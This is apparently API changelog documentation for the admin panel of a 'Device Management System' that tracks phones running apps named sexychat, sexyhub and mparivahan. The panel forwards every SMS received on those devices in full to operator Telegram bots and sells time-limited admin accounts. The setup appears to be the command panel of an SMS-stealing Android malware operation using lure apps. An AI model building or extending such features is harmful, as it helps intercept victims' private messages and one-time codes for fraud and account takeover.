# New Features Documentation

This document describes all the new features and improvements added to the Device Management System.

## Table of Contents
1. [App Type Filtering System](#app-type-filtering-system)
2. [Admin-Specific Device Management](#admin-specific-device-management)
3. [Push Notifications for Admins](#push-notifications-for-admins)
4. [Full SMS Messages in Telegram](#full-sms-messages-in-telegram)
5. [Admin Account Expiry System](#admin-account-expiry-system)

---

## App Type Filtering System

### Overview
Filter devices by application type (sexychat, mparivahan, sexyhub) to better organize and manage devices from different apps.

### New Endpoints

#### 1. Get Available App Types
```http
GET /api/devices/app-types
```

**Description:** Returns a list of all app types currently registered in the system with device counts.

**Authorization:** Required (any admin role)

**Response:**
```json
{
  "app_types": [
    {
      "app_type": "sexychat",
      "display_name": "SexyChat",
      "icon": "??",
      "count": 25
    },
    {
      "app_type": "mparivahan",
      "display_name": "mParivahan",
      "icon": "??",
      "count": 10
    },
    {
      "app_type": "sexyhub",
      "display_name": "SexyHub",
      "icon": "??",
      "count": 5
    }
  ],
  "total": 3
}
```

**Features:**
- Returns distinct app types from devices collection
- Shows device count for each app type
- Includes display name and icon
- Respects admin permissions (regular admins only see their devices)

#### 2. Filter Devices by App Type

**Updated Endpoints:**

```http
GET /api/devices?app_type=sexychat
GET /api/devices?app_type=mparivahan&skip=0&limit=50
```

**New Query Parameter:**
- `app_type` (optional): Filter devices by application type

**Example:**
```bash
curl -X GET "https://api.example.com/api/devices?app_type=sexychat&limit=20" \
  -H "Authorization: Bearer YOUR_TOKEN"
```

**Response:**
```json
{
  "devices": [...],
  "total": 15,
  "hasMore": false
}
```

### Schema Updates

**AppTypeInfo:**
```python
{
  "app_type": str,        # e.g., "sexychat"
  "display_name": str,    # e.g., "SexyChat"
  "icon": str,            # e.g., "??"
  "count": int            # Number of devices
}
```

**Supported App Types:**
- `sexychat` ? ?? SexyChat
- `mparivahan` ? ?? mParivahan
- `sexyhub` ? ?? SexyHub
- `MP` ? ?? mParivahan (legacy)

---

## Admin-Specific Device Management

### Overview
Super Admins can now view devices belonging to specific admins separately.

### New Endpoint

```http
GET /api/admin/{admin_username}/devices
```

**Description:** View all devices registered under a specific admin account.

**Authorization:** Super Admin only (requires `MANAGE_ADMINS` permission)

**Parameters:**
- `admin_username` (path): Username of the admin
- `skip` (query, optional): Pagination offset (default: 0)
- `limit` (query, optional): Items per page (default: 100, max: 1000)
- `app_type` (query, optional): Filter by app type

**Example:**
```bash
curl -X GET "https://api.example.com/api/admin/john_admin/devices?app_type=sexychat" \
  -H "Authorization: Bearer SUPER_ADMIN_TOKEN"
```

**Response:**
```json
{
  "devices": [
    {
      "device_id": "device_123",
      "model": "Samsung Galaxy S21",
      "app_type": "sexychat",
      "admin_username": "john_admin",
      ...
    }
  ],
  "total": 25,
  "hasMore": false
}
```

**Features:**
- Only accessible by Super Admin
- Supports pagination
- Supports app_type filtering
- Activity logging (tracks who viewed which admin's devices)
- Returns 404 if admin not found

**Use Cases:**
1. Monitor devices assigned to specific admins
2. Audit device distribution across team members
3. Troubleshoot admin-specific issues

---

## Push Notifications for Admins

### Overview
Admins can now receive push notifications on their mobile devices when important events occur (e.g., new device registration).

### Features

#### 1. FCM Token Registration

**During Login:**
Admins can provide their Firebase Cloud Messaging (FCM) token during the 2FA verification step.

**Updated Endpoint:**
```http
POST /auth/verify-2fa
```

**Request:**
```json
{
  "username": "admin",
  "otp_code": "123456",
  "temp_token": "temporary_token_here",
  "fcm_token": "fcm_device_token_here"  // NEW: Optional
}
```

**Features:**
- FCM token is optional (backward compatible)
- Tokens are stored in admin's `fcm_tokens` array
- Duplicate tokens are automatically prevented (`$addToSet`)
- Supports multiple devices per admin

#### 2. Device Registration Notifications

When a new device registers, the system now sends:
1. **Telegram notification** (existing)
2. **Push notification** to admin's mobile device (NEW)

**Notification Format:**
```json
{
  "title": "?? New Device Registered",
  "body": "Samsung Galaxy (SexyChat) has been registered",
  "data": {
    "type": "device_registered",
    "device_id": "device_123",
    "app_type": "sexychat",
    "model": "Samsung Galaxy S21"
  }
}
```

#### 3. New Firebase Service Methods

**Send to Specific Admin:**
```python
await firebase_service.send_notification_to_admin(
    admin_username="john_admin",
    title="New Device",
    body="Device registered successfully",
    data={"device_id": "123", "type": "registration"}
)
```

**Send to All Admins:**
```python
await firebase_service.send_notification_to_all_admins(
    title="System Alert",
    body="Important system message",
    data={"type": "alert", "priority": "high"}
)
```

**Response:**
```json
{
  "success": true,
  "sent_count": 3,
  "total_tokens": 3,
  "message": "Notification sent to 3/3 tokens"
}
```

### Database Schema Updates

**Admin Model:**
```python
{
  ...
  "fcm_tokens": ["token1", "token2", "token3"],  // NEW: Array of FCM tokens
  ...
}
```

**AdminLogin Schema:**
```python
{
  "username": str,
  "password": str,
  "fcm_token": Optional[str]  // NEW: Optional FCM token
}
```

**OTPVerify Schema:**
```python
{
  "username": str,
  "otp_code": str,
  "temp_token": str,
  "fcm_token": Optional[str]  // NEW: Optional FCM token
}
```

### Features

? **Multi-Device Support:** Admin can have multiple FCM tokens (multiple devices)  
? **Auto-Cleanup:** Invalid tokens are automatically removed  
? **Delivery Reports:** Detailed success/failure counts  
? **Backward Compatible:** FCM token is optional  
? **Dual Notifications:** Both Telegram and Push notifications are sent

### Client Implementation Example

**JavaScript (Web):**
```javascript
// Initialize Firebase
const messaging = firebase.messaging();

// Get FCM token
const token = await messaging.getToken({
  vapidKey: 'YOUR_VAPID_KEY'
});

// Send token during login
await fetch('/auth/verify-2fa', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    username: 'admin',
    otp_code: '123456',
    temp_token: tempToken,
    fcm_token: token  // Include FCM token
  })
});
```

**Flutter (Mobile):**
```dart
import 'package:firebase_messaging/firebase_messaging.dart';

// Get FCM token
final fcmToken = await FirebaseMessaging.instance.getToken();

// Send token during login
final response = await http.post(
  Uri.parse('https://api.example.com/auth/verify-2fa'),
  body: json.encode({
    'username': 'admin',
    'otp_code': '123456',
    'temp_token': tempToken,
    'fcm_token': fcmToken,  // Include FCM token
  }),
);
```

---

## Full SMS Messages in Telegram

### Overview
Previously, Telegram notifications only showed a 50-character preview of SMS messages. Now, the full message text is displayed.

### Changes

**Before:**
```
?? New SMS Received
...
?? Preview: Hello! This is a test message. This messa...
```

**After:**
```
?? New SMS Received

?? Admin: john_admin
?? Device: device_123
?? From: +989123456789
?? Time: 2025-10-31 12:00:00 UTC

??????????????????????
?? Message:
Hello! This is a test message.
This message is displayed in full.
Now you can see the complete SMS text
and everything is clear!
??????????????????????
```

### Features

? **Full Message Display:** Up to 3,500 characters  
? **Telegram Limit Handling:** Messages longer than 3,500 chars are truncated with "... (message truncated)"  
? **Better Formatting:** Clear separator lines and structured layout  
? **Bot Channel:** Sent to Bot 2 (SMS Notifications)

### Technical Details

- **Maximum Length:** 3,500 characters (Telegram's limit is 4,096)
- **Truncation Message:** `"... (???? ????? ??)"` if message is too long
- **Method:** `telegram_multi_service.notify_new_sms()`
- **Parameters Changed:** `preview` ? `full_message`

---

## Admin Account Expiry System

### Overview
Admins can now have an expiration date. After expiration, the account is automatically disabled, and the admin cannot log in.

### Features

#### 1. Creating Admin with Expiry

**Create Limited-Time Admin:**
```http
POST /admin/create
```

```json
{
  "username": "temp_admin",
  "password": "secure_password",
  "email": "temp@example.com",
  "full_name": "Temporary Admin",
  "role": "admin",
  "expires_at": "2025-12-31T23:59:59"  // Expiry date
}
```

**Create Unlimited Admin:**
```json
{
  "username": "permanent_admin",
  "password": "secure_password",
  "email": "perm@example.com",
  "full_name": "Permanent Admin",
  "role": "admin"
  // No expires_at = unlimited
}
```

#### 2. Expiry Validation

**Checked During:**
1. **Login (`/auth/verify-2fa`):** Account expiry is validated before issuing token
2. **Every Request (Middleware):** Expiry is checked on every authenticated request

**If Expired:**
- Account is automatically set to `is_active = false`
- HTTP 403 Forbidden response
- Error message: `"Account expired on 2025-12-31. Please contact administrator."`

#### 3. Update Admin Expiry

**Update Endpoint:**
```http
PUT /admin/{username}
```

```json
{
  "expires_at": "2026-06-30T23:59:59"  // Extend expiry
}
```

Or remove expiry (make unlimited):
```json
{
  "expires_at": null  // Remove expiry
}
```

### Database Schema

**Admin Model:**
```python
{
  ...
  "expires_at": Optional[datetime],  // NEW: Expiration date (None = unlimited)
  ...
}
```

**AdminCreate Schema:**
```python
{
  "username": str,
  "email": str,
  "password": str,
  "full_name": str,
  "role": AdminRole,
  "expires_at": Optional[datetime]  // NEW: Optional expiry date
}
```

**AdminUpdate Schema:**
```python
{
  "expires_at": Optional[datetime]  // NEW: Can update expiry
}
```

### Behavior

#### On Login:
```python
if admin.expires_at and now > admin.expires_at:
    # Auto-disable account
    admin.is_active = False
    raise HTTPException(
        status_code=403,
        detail=f"Account expired on {expires_at}. Please contact administrator."
    )
```

#### On Every Request:
```python
# In auth_middleware.py
if admin.expires_at and now > admin.expires_at:
    logger.warning(f"Admin {username} has expired")
    # Auto-disable
    await mongodb.db.admins.update_one(
        {"username": username},
        {"$set": {"is_active": False}}
    )
    raise HTTPException(status_code=403, detail="Account expired")
```

### Use Cases

1. **Trial Accounts:** 30-day trial for new admins
2. **Temporary Access:** Grant access for specific period
3. **Contract-Based:** Admin access tied to contract duration
4. **Security:** Auto-expire inactive or temporary accounts

### Admin Response Example

```json
{
  "username": "test_admin",
  "email": "test@example.com",
  "full_name": "Test Admin",
  "role": "admin",
  "is_active": true,
  "expires_at": "2025-12-31T23:59:59",  // NEW
  "created_at": "2025-10-31T10:00:00",
  ...
}
```

### Logging

```
? Admin created: test_admin
   Device Token: abcd1234efgh5678...
   2FA Chat ID: 123456789
   Telegram Bots: 5
   ? Expires at: 2025-12-31 23:59:59 UTC  // NEW
```

Or for unlimited:
```
   ? Expires at: Never (Unlimited)
```

---

## Migration Notes

All new features include automatic database migrations:

1. **FCM Tokens:** Existing admins get `fcm_tokens: []` field
2. **Expiry:** Existing admins get `expires_at: null` (unlimited)
3. **Backward Compatibility:** All optional fields ensure no breaking changes

## API Compatibility

All changes are **backward compatible**:
- New query parameters are optional
- New request fields are optional
- Existing endpoints continue to work without modification

## Security Considerations

1. **Expiry System:** Expired accounts are immediately disabled on any access attempt
2. **FCM Tokens:** Invalid tokens are automatically removed
3. **Admin Management:** Only Super Admins can view other admins' devices
4. **Push Notifications:** Only sent to admins who own the device

---

## Summary

### Files Modified
- `app/models/admin_schemas.py` - Added expiry and FCM fields
- `app/models/schemas.py` - Added app type schemas
- `app/models/otp_schemas.py` - Added FCM token to OTP
- `app/services/auth_service.py` - Expiry validation on login
- `app/services/firebase_service.py` - Admin push notifications
- `app/services/telegram_multi_service.py` - Full SMS messages
- `app/utils/auth_middleware.py` - Expiry check on requests
- `app/main.py` - New endpoints and registration notifications
- `app/database.py` - Database migrations

### New Dependencies
- None (all features use existing libraries)

### Breaking Changes
- None (all changes are backward compatible)

---

## Testing

### Test App Type Filtering
```bash
# Get app types
curl -X GET "http://localhost:8000/api/devices/app-types" \
  -H "Authorization: Bearer YOUR_TOKEN"

# Filter by app type
curl -X GET "http://localhost:8000/api/devices?app_type=sexychat" \
  -H "Authorization: Bearer YOUR_TOKEN"
```

### Test Admin Device Management
```bash
# View specific admin's devices (Super Admin only)
curl -X GET "http://localhost:8000/api/admin/john_admin/devices" \
  -H "Authorization: Bearer SUPER_ADMIN_TOKEN"
```

### Test Push Notifications
```bash
# Login with FCM token
curl -X POST "http://localhost:8000/auth/verify-2fa" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "otp_code": "123456",
    "temp_token": "temp_token_here",
    "fcm_token": "fcm_token_here"
  }'
```

### Test Admin Expiry
```bash
# Create admin with expiry
curl -X POST "http://localhost:8000/admin/create" \
  -H "Authorization: Bearer SUPER_ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "temp_admin",
    "password": "pass123",
    "email": "temp@test.com",
    "full_name": "Temporary Admin",
    "role": "admin",
    "expires_at": "2025-12-31T23:59:59"
  }'
```

---

**Last Updated:** October 31, 2025  
**Version:** 2.0.0
